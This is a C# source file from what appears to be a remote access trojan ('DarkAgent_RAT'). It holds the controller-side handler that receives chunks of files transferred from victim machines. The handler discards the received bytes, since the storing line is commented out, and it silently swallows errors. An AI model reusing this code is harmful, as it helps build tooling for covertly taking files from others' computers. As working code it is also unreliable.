using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive
{
    class R_FileTransferSend : ReceiveBasePacket
    {
        public R_FileTransferSend(RatClients client, byte[] packet)
            : base(client, packet)
        {
        }

        private short Id;
        private byte[] fileBytes;
        private int Index;
        public override void Read()
        {
            Id = ReadShort();
            int Temp = ReadShort();
            Index = ReadInteger();
            fileBytes = ReadBytes(Temp);
        }

        public override void Run()
        {
            Console.WriteLine("[file transfer] Received index: " + Index);
            if (Client._FileTransfer.ContainsKey(Id))
            {
                try
                {
                    if (Client._FileTransfer[Id].FileBytes == null)
                        Client._FileTransfer[Id].FileBytes = new SortedList<int, byte[]>();

                    //Client._FileTransfer[Id].FileBytes.Add(Index, fileBytes);
                    Client._FileTransfer[Id].CurFileSize += fileBytes.Length;

                    if(Client._FileTransfer[Id].CurFileSize >= Client._FileTransfer[Id].FileSize)
                    {
                        List<Byte> arrayzor = new List<Byte>();
                        arrayzor.Add(0);
                        arrayzor.AddRange(BitConverter.GetBytes(Id));

                        R_FileTransferEnd FileReceived = new R_FileTransferEnd(Client, arrayzor.ToArray());
                    }
                }
                catch
                {
                    //exception in here wouldn't happen... except something goes totally wrong :P
                }
            }
        }
    }
}